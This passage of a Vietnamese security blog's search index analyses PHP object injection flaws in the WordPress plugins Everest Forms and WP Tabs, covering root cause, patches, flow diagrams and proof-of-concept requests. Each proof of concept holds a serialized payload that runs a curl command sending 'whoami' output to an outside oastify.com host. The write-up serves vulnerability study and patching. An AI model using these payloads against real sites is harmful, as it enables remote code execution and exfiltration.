c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi Remote Code Execution (RCE). Thi·∫øu ki·ªÉm tra an to√†n: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize. Kh√¥ng c√≥ c∆° ch·∫ø fallback: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c. B·∫£n v√° (v3.1.2): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng evf_maybe_unserialize() thay cho maybe_unserialize() c·ªßa WordPress: function evf_maybe_unserialize( $data, $options = array() ) { if ( is_serialized( $data ) ) { if ( version_compare( PHP_VERSION, '7.1.0', '\u003e=' ) ) { $options = wp_parse_args( $options, array( 'allowed_classes' =\u003e false ) ); return @unserialize( trim( $data ), $options ); //phpcs:ignore. } return @unserialize( trim( $data ) ); //phpcs:ignore. } return $data; } unserialize() ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi option 'allowed_classes' =\u003e false ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng. ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt submenu Entries: add_submenu_page( 'everest-forms', esc_html__( 'Everest Forms Entries', 'everest-forms' ), esc_html__( 'Entries', 'everest-forms' ), current_user_can( 'everest_forms_view_entries' ) ? 'everest_forms_view_entries' : 'everest_forms_view_others_entries', 'evf-entries', array( $this, 'entries_page' ) ); Callback entries_page ƒë∆∞·ª£c g·ªçi khi truy c·∫≠p v√†o submenu n√†y: public function entries_page() { EVF_Admin_Entries::page_output(); } H√†m g·ªçi ƒë·∫øn page_output() public static function page_output() { if ( apply_filters( 'everest_forms_entries_list_actions', false ) ) { do_action( 'everest_forms_entries_list_actions_execute' ); } elseif ( isset( $_GET['view-entry'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification include 'views/html-admin-page-entries-view.php'; } else { self::table_list_output(); } } Khi $_GET['view-entry'] t·ªìn t·∫°i th√¨ view html-admin-page-entries-view.php s·∫Ω ƒë∆∞·ª£c include. Entries Page\rTrang n√†y s·∫Ω hi·ªÉn th·ªã t·∫•t c·∫£ n·ªôi dung form ƒë∆∞·ª£c submit t·ª´ ng∆∞·ªùi d√πng. $entry_meta = apply_filters( 'everest_forms_entry_single_data', $entry-\u003emeta, $entry, $form_data ); ... foreach ( $entry_meta as $meta_key =\u003e $meta_value ) { $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value ); if ( evf_is_json( $meta_value ) ) { $meta_value = json_decode( $meta_value, true ); $meta_value = $meta_value['value']; } ... $field_value = apply_filters( 'everest_forms_html_field_value', $meta_value, $entry_meta[ $meta_key ], $entry_meta, 'entry-single' ); ... if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } ... } $entry_meta l√† t·∫≠p d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng ƒë√£ submit t·ª´ form hi·ªán t·∫°i. M·ªói ph·∫ßn t·ª≠ trong m·∫£ng n√†y bao g·ªìm m·ªôt c·∫∑p meta_key v√† meta_value, v√† h·ªá th·ªëng s·∫Ω duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ ƒë·ªÉ x·ª≠ l√Ω. Trong v√≤ng l·∫∑p, gi√° tr·ªã $meta_value ƒë∆∞·ª£c ki·ªÉm tra: N·∫øu gi√° tr·ªã l√† JSON H√†m evf_is_json() x√°c ƒë·ªãnh xem chu·ªói c√≥ ph·∫£i JSON h·ª£p l·ªá hay kh√¥ng. N·∫øu ƒë√∫ng, d·ªØ li·ªáu ƒë∆∞·ª£c gi·∫£i m√£ b·∫±ng json_decode() v√† l·∫•y gi√° tr·ªã t·∫°i $meta_value['value']. Sau ƒë√≥ $field_value ƒë∆∞·ª£c t·∫°o ra Gi√° tr·ªã n√†y ƒë∆∞·ª£c t·∫°o t·ª´ $meta_value['value'] th√¥ng qua b·ªô l·ªçc everest_forms_html_field_value. X·ª≠ l√Ω d·ªØ li·ªáu serialize N·∫øu $field_value c√≥ ƒë·ªãnh d·∫°ng serialize, h√†m maybe_unserialize() s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ gi·∫£i m√£ d·ªØ li·ªáu v·ªÅ d·∫°ng b√¨nh th∆∞·ªùng. ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD A[\"User submits form ‚Üí Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() ‚Üí meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ‚Üê Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection ‚Üí Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form ‚Üí Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() ‚Üí meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ‚Üê Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection ‚Üí Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form ‚Üí Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() ‚Üí meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ‚Üê Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection ‚Üí Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form ‚Üí Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() ‚Üí meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ‚Üê Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection ‚Üí Possible exploit if POP chain exists\"] N --\u003e|No| L ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Submit form v·ªõi gi√° tr·ªã ƒë∆∞·ª£c encode JSON ch·ª©a chu·ªói serialized: POST /2025/11/22/test/ HTTP/1.1 Host: localhost ... Content-Disposition: form-data; name=\"everest_forms[form_fields][fullname]\" {\"value\":\"a:1:{i:0;O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:74:\\\"curl http:\\/\\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\\\";}}\"} ------geckoformboundary8355bd6da3783bb27aa92837fe803a6e ... Administrator xem entry ƒë∆∞·ª£c submit K·∫øt qu·∫£\r","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng t·ªìn t·∫°i do vi·ªác unserialize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr·ª±c ti·∫øp th√¥ng qua maybe_unserialize() m√† kh√¥ng gi·ªõi h·∫°n l·ªõp ƒë∆∞·ª£c ph√©p kh·ªüi t·∫°o. ƒêi·ªÅu n√†y d·∫´n t·ªõi kh·∫£ nƒÉng PHP Object Injection, v√† trong m√¥i tr∆∞·ªùng c√≥ s·∫µn chu·ªói POP, k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nguy hi·ªÉm nh∆∞ ƒë·ªçc, ghi, x√≥a file ho·∫∑c th·∫≠m ch√≠ th·ª±c thi m√£ t·ª´ xa. B·∫£n v√° s·ª≠ d·ª•ng evf_maybe_unserialize() v·ªõi allowed_classes =\u003e false ƒë√£ tri·ªát ti√™u ho√†n to√†n nguy c∆° n√†y. ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rRoot cause: s·ª≠ d·ª•ng maybe_unserialize() tr√™n d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng m√† kh√¥ng ki·ªÉm so√°t l·ªõp ƒë∆∞·ª£c ph√©p t·∫°o ra. Impact: Object Injection v√† c√≥ th·ªÉ ti·∫øn t·ªõi RCE n·∫øu t·ªìn t·∫°i POP chain t·ª´ plugin ho·∫∑c theme kh√°c. Attack surface: B·ªã trigger khi admin m·ªü trang xem Entries; d·ªØ li·ªáu ƒë·ªôc h·∫°i ƒë√£ t·ªìn t·∫°i t·ª´ ph·∫ßn submit form. Fix: S·ª≠ d·ª•ng unserialize() v·ªõi t√πy ch·ªçn allowed_classes = false, ngƒÉn ch·∫∑n t·∫°o object t·ª´ d·ªØ li·ªáu kh√¥ng tin c·∫≠y. Lesson learned: M·ªçi d·ªØ li·ªáu unserialize ph·∫£i ƒë∆∞·ª£c h·∫°n ch·∫ø l·ªõp, l·ªçc ho·∫∑c chuy·ªÉn sang c√°c ƒë·ªãnh d·∫°ng an to√†n h∆°n nh∆∞ JSON. ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Everest Forms Plugin \u003c= 3.1.1 is vulnerable to PHP Object Injection ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Tabs Plugin.","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Deserialization of Untrusted Data trong ShapedPlugin LLC WP Tabs cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WP Tabs: t·ª´ n/a cho ƒë·∫øn phi√™n b·∫£n 2.2.12. CVE ID: CVE-2025-48134 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.2.12 Patched Versions: 2.2.13 CVSS severity: High (7.2) Required Privilege: Administrator Product: [WordPress WP Tabs Plugin]https://wordpress.org/plugins/wp-expand-tabs-free/) ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Tabs: 2.2.12 ‚Äì vulnerable 2.2.13 ‚Äì **patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v2.2.12): $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); Trong ƒëo·∫°n m√£ n√†y, h√†m maybe_unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($value sau khi replace '{#ID#}' b·∫±ng $new_tabs_id). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng: Nguy c∆° Object Injection: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn Object Injection v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi Remote Code Execution (RCE). Thi·∫øu ki·ªÉm tra an to√†n: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize. Kh√¥ng c√≥ c∆° ch·∫ø fallback: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c. B·∫£n v√° (v2.2.13): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng unserialize v·ªõi option 'allowed_classes' =\u003e false ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng. ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (wp_ajax_) $this-\u003eloader-\u003eadd_action( 'wp_ajax_tabs_import_shortcode', $import_export, 'import_shortcode' ); Khi truy c·∫≠p endpoint /wp-admin/admin-ajax.php v·ªõi action=tabs_import_shortcode th√¨ callback import_shortcode s·∫Ω ƒë∆∞·ª£c g·ªçi public function import_shortcode() { $nonce = ( ! empty( $_POST['nonce'] ) ) ? sanitize_text_field( wp_unslash( $_POST['nonce'] ) ) : ''; if ( ! wp_verify_nonce( $nonce, 'wptabspro_options_nonce' ) ) { wp_send_json_error( array( 'message' =\u003e esc_html__( 'Error: Nonce verification has failed. Please try again.', 'wp-expand-tabs-free' ) ), 401 ); } $allow_tags = isset( $_POST['unSanitize'] ) ? sanitize_text_field( wp_unslash( $_POST['unSanitize'] ) ) : ''; // Don't worry sanitize after JSON decode below. $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); $shortcodes = $allow_tags ? $data['shortcode'] : wp_kses_post_deep( $data['shortcode'] ); if ( ! $data ) { wp_send_json_error( array( 'message' =\u003e __( 'Nothing to import.', 'wp-expand-tabs-free' ), ), 400 ); } $status = $this-\u003eimport( $shortcodes ); if ( is_wp_error( thing: $status ) ) { wp_send_json_error( array( 'message' =\u003e $status-\u003eget_error_message(), ), 400 ); } wp_send_json_success( $status, 200 ); } H√†m th·ª±c hi·ªán ki·ªÉm tra nonce, n·∫øu kh√¥ng h·ª£p l·ªá th√¨ g·ª≠i error v√† d·ª´ng ch∆∞∆°ng tr√¨nh l·∫°i. Khi test c√°c ch·ª©c nƒÉng c·ªßa plugin, t√¥i th·∫•y ch·ª©c nƒÉng import xu·∫•t hi·ªán ·ªü endpoint /wp-admin/edit.php?post_type=sp_wp_tabs\u0026page=tab_tools#tab=2 Import feature\rCh·ª©c nƒÉng n√†y ch·ªâ d√†nh cho Administrator, n√™n nonce h·ª£p l·ªá c≈©ng l√† nonce thu·ªôc v·ªÅ Administrator. D·ªØ li·ªáu trong JSON file ƒë∆∞·ª£c upload s·∫Ω ƒë∆∞·ª£c g√°n cho param shortcode khi POST request ƒë∆∞·ª£c g·ª≠i. $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); Plugin l·∫•y d·ªØ li·ªáu n√†y v√† th·ª±c hi·ªán decode JSON 2 l·∫ßn. ·ªû l·∫ßn 2 v·ªõi tham s·ªë th·ª© 2 associative=true th√¨ JSON s·∫Ω ƒë∆∞·ª£c convert sang array trong PHP theo m√¥ t·∫£ c·ªßa h√†m: Tr√≠ch d·∫´n\r@param $associative: When true , JSON objects will be returned as associative arrays; when false , JSON objects will be returned as objects. When null , JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags. Sau ƒë√≥ import( $shortcodes ) ƒë∆∞·ª£c g·ªçi v·ªõi $shortcodes l√† gi√° tr·ªã c·ªßa $data['shortcode'], ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c c·∫•u tr√∫c hi·ªán t·∫°i c·ªßa JSON c·∫ßn upload: public function import( $shortcodes ) { $errors = array(); foreach ( $shortcodes as $index =\u003e $shortcode ) { $errors[ $index ] = array(); $new_tabs_id = 0; try { ... if ( isset( $shortcode['meta'] ) \u0026\u0026 is_array( $shortcode['meta'] ) ) { foreach ( $shortcode['meta'] as $key =\u003e $value ) { if ( 'sp_tab_source_options' === $key || 'sp_tab_shortcode_options' === $key ) { $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); update_post_meta( $new_tabs_id, $key, $sanitize_value ); } } } } catch ( Exception $e ) { array_push( $errors[ $index ], $e-\u003egetMessage() ); // If there was a failure somewhere, clean up. wp_trash_post( $new_tabs_id ); } ... } $errors = reset( $errors ); return isset( $errors[0] ) ? new WP_Error( 'import_tabs_error', $errors[0] ) : $shortcodes; } H√†m duy·ªát qua c√°c shortcode v√† ki·ªÉm tra shortcode['meta'] c√≥ t·ªìn l·∫°i d∆∞·ªõi d·∫°ng m·∫£ng hay kh√¥ng, n·∫øu c√≥ s·∫Ω duy·ªát t·ª´ng ph·∫ßn t·ª´ trong m·∫£ng $shortcode['meta']. $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); N·∫øu key l√† sp_tab_source_options ho·∫∑c sp_tab_shortcode_options: Thay th·∫ø chu·ªói {#ID#} trong gi√° tr·ªã b·∫±ng $new_tabs_id. G·ªçi h√†m maybe_unserialize() ƒë·ªÉ gi·∫£i m√£ d·ªØ li·ªáu n·∫øu n√≥ ƒëang ·ªü d·∫°ng serialize. G·ªçi h√†m sanitize_and_collect_metabox_data() ƒë·ªÉ l·ªçc v√† chu·∫©n h√≥a d·ªØ li·ªáu. Cu·ªëi c√πng, ","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice ‚Üí extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ‚Üê Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection ‚Üí Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice ‚Üí extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ‚Üê Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection ‚Üí Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice ‚Üí extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ‚Üê Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection ‚Üí Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\rgraph TD\rA[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"]\rB --\u003e C{\"Check nonce: wp_verify_nonce()\"}\rC --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"]\rC --\u003e|Pass| D[\"json_decode() twice ‚Üí extract $shortcodes\"]\rD --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"]\rD --\u003e|Valid| E[\"Call import($shortcodes)\"]\rE --\u003e F[\"Loop through each shortcode\"]\rF --\u003e H{\"Has 'meta' and is array?\"}\rH --\u003e|No| Z[\"Skip entry\"]\rH --\u003e|Yes| I[\"Loop each meta field\"]\rI --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"}\rJ --\u003e|No| Z\rJ --\u003e|Yes| K[\"Replace {#ID#} with new ID\"]\rK --\u003e L[\"maybe_unserialize() ‚Üê Vulnerable\"]\rL --\u003e M{\"Does unserialize create object?\"}\rM --\u003e|Yes| R[\"Object Injection ‚Üí Possible RCE if malicious class exists\"]\rM --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"]\r","date":"2025-11-24","objectID":"/vi/posts/2025-11-24-cve-2025-48134/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/vi/posts/2025-11-24-cve-2025-48134/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Import JSON file: { \"shortcode\": { \"shortcode1\": { \"meta\": { \"sp_tab_source_options\": \"O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:75:\\\"curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\\\";}\" } } } } POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... shortcode=%22%7B%5Cr%5Cn++%5C%22shortcode%5C%22%3A+%7B%5Cr%5Cn++++%5C%22shortcode1%5C%22%3A+%7B%5Cr%5Cn++++++%5C%22meta%5C%22%3A+%7B%5Cr%5Cn++++++++%5C%22sp_tab_source_options%5C%22%3A+%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl+http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn++++++%7D%5Cr%5Cn++++%7D%5Cr%5Cn++%7D%5Cr%5Cn%7D%22\u0026action=tabs_import_shortcode\u0026nonce=b6d5e5977d\u0026unSanitize= K·∫øt 